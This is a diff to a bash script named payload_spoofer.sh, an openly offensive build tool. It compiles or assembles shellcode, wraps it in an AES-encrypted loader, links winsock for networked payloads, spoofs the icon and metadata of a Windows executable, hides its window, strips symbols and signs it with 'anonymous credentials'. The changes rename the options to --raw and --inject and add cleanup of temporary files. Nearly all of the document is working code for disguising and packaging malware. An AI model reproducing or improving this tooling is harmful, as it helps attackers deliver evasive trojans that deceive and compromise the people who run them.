@@ -14,25 +14,26 @@ ICONS_DIR="icons"
 OUTPUT=""
 TYPE=""
 SOURCE_FILE=""
-ASM_SOURCE=""
+INJECT_SOURCE=""
 ARCH="64"
 USE_LOADER_MODE=false
 SIGN_PAYLOAD=false
+IS_CPP=false
 EXTRA_FILES=()
 
 show_help() {
   echo -e "---------------------------------------"
-  echo -e "${BLUE}${PREFIX} Usage:${NC} ./payload_spoofer.sh --c <source.c> | --asm <shellcode.asm> --type <spoof_type> [options]"
+  echo -e "${BLUE}${PREFIX} Usage:${NC} ./payload_spoofer.sh --raw <source.c> | --inject <shellcode.bin> --type <spoof_type> [options]"
   echo -e "${BLUE}${PREFIX} Description:${NC} Compile a Windows payload with spoofed icon and metadata."
   echo -e "${BLUE}${PREFIX} Options:${NC}"
-  echo -e "  --type <name>      Required. Spoof type (must match files in icons/ and metadata/)"
-  echo -e "  --c <file>         Compile a C file using basic loader logic (no AES)"
-  echo -e "  --asm <file>       Assemble a .asm shellcode and inject via AES loader"
-  echo -e "  --output <name>    Optional. Output binary name (default: <type>.exe)"
-  echo -e "  --add-file <file>  Optional. Add extra source file to compile"
-  echo -e "  --sign             Optional. Sign the final executable"
-  echo -e "  --list             Show available spoof types"
-  echo -e "  -h, --help         Show this help message"
+  echo -e "  --type <name>       Required. Spoof type (must match files in icons/ and metadata/)"
+  echo -e "  --raw <file>        Compile a C or bin file using basic loader logic"
+  echo -e "  --inject <file>     Assemble a shellcode fom a bin, c or asm file and inject it via AES loader"
+  echo -e "  --output <name>     Output binary name (default: <type>.exe)"
+  echo -e "  --add-file <file>   Add extra source file to the compilation"
+  echo -e "  --sign              Sign the final executable using anonymous credentials"
+  echo -e "  --list              Show available spoof types"
+  echo -e "  -h, --help          Show this help message"
   echo -e "---------------------------------------"
   exit 0
 }
@@ -60,6 +61,11 @@ check_dependencies() {
   done
 }
 check_dependencies
+
+cleanup_aes() {
+  echo -e "${BLUE}${PREFIX} Cleaning temporary AES files...${NC}"
+  rm -f payload.enc "$AES_DIR"/payload_data.h /tmp/{raw_payload.exe,shellcode.o,raw_shellcode.bin}
+}
 
 sign_payload() {
   if ! command -v osslsigncode &>/dev/null; then
@@ -113,13 +119,13 @@ while [[ $# -gt 0 ]]; do
       EXTRA_FILES+=("$2")
       shift 2
       ;;
-    --c)
+    --raw)
       SOURCE_FILE="$2"
       USE_LOADER_MODE=false
       shift 2
       ;;
-    --asm)
-      ASM_SOURCE="$2"
+    --inject)
+      INJECT_SOURCE="$2"
       USE_LOADER_MODE=true
       shift 2
       ;;
@@ -136,18 +142,18 @@ done
 
 
 
-if [[ -z "$SOURCE_FILE" && -z "$ASM_SOURCE" ]]; then
-  echo -e "${RED}${PREFIX} No input source provided. Use --c or --asm.${NC}"
+if [[ -z "$SOURCE_FILE" && -z "$INJECT_SOURCE" ]]; then
+  echo -e "${RED}${PREFIX} No input source provided. Use --raw or --inject.${NC}"
   show_help
 fi
 
 if [[ -n "$SOURCE_FILE" && ! -f "$SOURCE_FILE" ]]; then
-  echo -e "${RED}${PREFIX} C file '$SOURCE_FILE' does not exist.${NC}"
+  echo -e "${RED}${PREFIX} The file '$SOURCE_FILE' does not exist.${NC}"
   exit 1
 fi
 
-if [[ -n "$ASM_SOURCE" && ! -f "$ASM_SOURCE" ]]; then
-  echo -e "${RED}${PREFIX} ASM file '$ASM_SOURCE' does not exist.${NC}"
+if [[ -n "$INJECT_SOURCE" && ! -f "$INJECT_SOURCE" ]]; then
+  echo -e "${RED}${PREFIX} The file '$INJECT_SOURCE' does not exist.${NC}"
   exit 1
 fi
 
@@ -157,13 +163,9 @@ fi
 
 if [[ -n "$SOURCE_FILE" ]]; then
   EXT="${SOURCE_FILE##*.}"
-  if [[ "$EXT" == "cpp" ]]; then
+  if [[ "${EXT,,}" == "cpp" ]]; then
     IS_CPP=true
   fi
-fi
-
-if [[ "$EXT" == "cpp" ]]; then
-  IS_CPP=true
 fi
 
 if [[ -z "$TYPE" ]]; then
@@ -220,36 +222,37 @@ if $USE_LOADER_MODE; then
   RAW_PAYLOAD="/tmp/raw_shellcode.bin"
 
   RAW_LINK=""
-  TARGET_SOURCE="${SOURCE_FILE:-$ASM_SOURCE}"
+  TARGET_SOURCE="${SOURCE_FILE:-$INJECT_SOURCE}"
   if grep -qi "WSA\|winsock" "$TARGET_SOURCE"; then
-    CMD+=("-lws2_32")
     RAW_LINK="-lws2_32"
+    if [[ "$USE_LOADER_MODE" == false ]]; then
+      CMD+=("$RAW_LINK")
+    fi
   fi
 
   if [[ -n "$SOURCE_FILE" ]]; then
-    # C shellcode path
-    x86_64-w64-mingw32-gcc "$SOURCE_FILE" -c -o /tmp/shellcode.o \
+    x86_64-w64-mingw32-gcc "$SOURCE_FILE" -static -c -o /tmp/shellcode.o \
       -nostdlib -fno-asynchronous-unwind-tables -fno-stack-protector -ffreestanding $RAW_LINK || {
       echo -e "${RED}${PREFIX} Failed to compile C shellcode source.${NC}"
       exit 1
     }
     objcopy -O binary /tmp/shellcode.o "$RAW_PAYLOAD"
-  elif [[ -n "$ASM_SOURCE" ]]; then
-    case "$ASM_SOURCE" in
+  elif [[ -n "$INJECT_SOURCE" ]]; then
+    case "$INJECT_SOURCE" in
       *.bin)
         echo -e "${BLUE}${PREFIX} Using raw .bin shellcode directly...${NC}"
-        cp "$ASM_SOURCE" "$RAW_PAYLOAD"
+        cp "$INJECT_SOURCE" "$RAW_PAYLOAD"
         ;;
       *.asm)
         echo -e "${BLUE}${PREFIX} Assembling .asm shellcode with NASM...${NC}"
-        nasm -f bin "$ASM_SOURCE" -o "$RAW_PAYLOAD" || {
+        nasm -f bin "$INJECT_SOURCE" -o "$RAW_PAYLOAD" || {
           echo -e "${RED}${PREFIX} Failed to assemble ASM shellcode.${NC}"
           exit 1
         }
         ;;
       *.c)
         echo -e "${BLUE}${PREFIX} Compiling .c shellcode to raw binary...${NC}"
-        x86_64-w64-mingw32-gcc "$ASM_SOURCE" -c -o /tmp/shellcode.o \
+        x86_64-w64-mingw32-gcc "$INJECT_SOURCE" -c -o /tmp/shellcode.o \
           -nostdlib -fno-asynchronous-unwind-tables -fno-stack-protector -ffreestanding $RAW_LINK || {
           echo -e "${RED}${PREFIX} Failed to compile C shellcode source.${NC}"
           exit 1
@@ -257,7 +260,7 @@ if $USE_LOADER_MODE; then
         objcopy -O binary /tmp/shellcode.o "$RAW_PAYLOAD"
         ;;
       *)
-        echo -e "${RED}${PREFIX} Unsupported format for --asm: $ASM_SOURCE${NC}"
+        echo -e "${RED}${PREFIX} Unsupported format for --inject: $INJECT_SOURCE${NC}"
         exit 1
         ;;
     esac
@@ -292,17 +295,17 @@ CMD+=("-mwindows")
 CMD+=("-s")
 CMD+=("-o" "$OUTPUT")
 
-echo -e "${BLUE}${PREFIX} Compiling payload (${ARCH}-bit, mode: ${USE_LOADER_MODE:+AES Loader} = ${USE_LOADER_MODE:-Direct})...${NC}"
+echo -e "${BLUE}${PREFIX} Compiling payload (${ARCH}-bit, ${USE_LOADER_MODE:+AES Loader}: ${USE_LOADER_MODE:-Direct})...${NC}"
 if "${CMD[@]}"; then
   echo -e "${GREEN}${PREFIX} Compilation successful: ${WHITE}${OUTPUT}${NC}"
   if $SIGN_PAYLOAD; then
     sign_payload
   fi
   if $USE_LOADER_MODE; then
-    echo -e "${BLUE}${PREFIX} Cleaning temporary AES files...${NC}"
-    rm -f payload.enc key_iv.h /tmp/raw_payload.exe /tmp/shellcode.o /tmp/raw_shellcode.bin
+    cleanup_aes
   fi
 else
   echo -e "${RED}${PREFIX} Compilation failed.${NC}"
+  $USE_LOADER_MODE && cleanup_aes
   exit 1
 fi
